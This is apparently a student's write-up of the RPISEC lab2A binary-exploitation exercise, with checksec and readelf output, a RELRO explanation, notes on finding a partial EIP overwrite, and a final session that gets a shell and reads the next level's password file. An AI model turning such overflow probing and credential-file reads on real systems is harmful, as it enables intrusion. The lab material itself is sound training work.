RPISEC - lab02A

#
./lab2A: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=97dc3369efabbd3ce510dfdc0c0a0c45aed11070, not stripped

- 32 Byte Arch LSB
- dynamic
- not stripped


# checksec --file ./lab2A
[*] '/root/lab/rpi_mbe/MBE_release/levels/lab02/lab2A'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)


RELRO: 
		RELRO is a generic mitigation technique to harden the data sections 
		of an ELF binary/process. There are two different "operation modes" of RELRO
		Partial or Full.

	How does the generic mitigation technique work?

Partial RELRO: If only partial RELRO is used, it is still possible to modify arbitrary
				GOT entries to gain control of the execution flow of a process. 

Full RELRO: If full RELRO is enabled, the attempt to overwrite a GOT address leads 
				to an error as the GOT section is mapped read-only.



ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048600
  Start of program headers:          52 (bytes into file)
  Start of section headers:          4440 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         30
  Section header string table index: 27



Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00006c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          08048218 000218 0001a0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080483b8 0003b8 000118 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080484d0 0004d0 000034 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048504 000504 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048524 000524 000010 08   A  5   0  4
  [10] .rel.plt          REL             08048534 000534 000030 08   A  5  12  4
  [11] .init             PROGBITS        08048564 000564 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048590 000590 000070 04  AX  0   0 16
  [13] .text             PROGBITS        08048600 000600 000272 00  AX  0   0 16
  [14] .fini             PROGBITS        08048874 000874 000014 00  AX  0   0  4
  [15] .rodata           PROGBITS        08048888 000888 00009f 00   A  0   0  4
  [16] .eh_frame_hdr     PROGBITS        08048928 000928 00003c 00   A  0   0  4
  [17] .eh_frame         PROGBITS        08048964 000964 0000f0 00   A  0   0  4
  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000024 04  WA  0   0  4
  [24] .data             PROGBITS        0804a024 001024 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a02c 00102c 000008 00  WA  0   0  4
  [26] .comment          PROGBITS        00000000 00102c 000024 01  MS  0   0  1
  [27] .shstrtab         STRTAB          00000000 001050 000106 00      0   0  1
  [28] .symtab           SYMTAB          00000000 001608 000490 10     29  48  4
  [29] .strtab           STRTAB          00000000 001a98 0002b4 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00a54 0x00a54 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00124 0x0012c RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000928 0x08048928 0x08048928 0x0003c 0x0003c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .jcr .dynamic .got 

#
python -c 'import sys; sys.stdout.write("A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 11)' | strace ./lab2A

- EIP overwrite @ 500 bytes
- pattern_create did not work as the EIP (4bytes) was overwritten by 4 different addresses.
- Partial EIP Overwrite
- Process of Elimination to control EIP overwrite.
- If stack is moved, the partial EIP overwrite would move, cause an error.


# review x2A.py

# Final

lab2A@warzone:/levels/lab02$ (python /tmp/x2A.py;cat) | ./lab2A 
Input 10 words:
Failed to read word
You got it
id
uid=1008(lab2A) gid=1009(lab2A) euid=1009(lab2end) groups=1010(lab2end),1001(gameuser),1009(lab2A)
whoami
lab2end
cat /home/lab2end/.pass
D1d_y0u_enj0y_y0ur_cats?
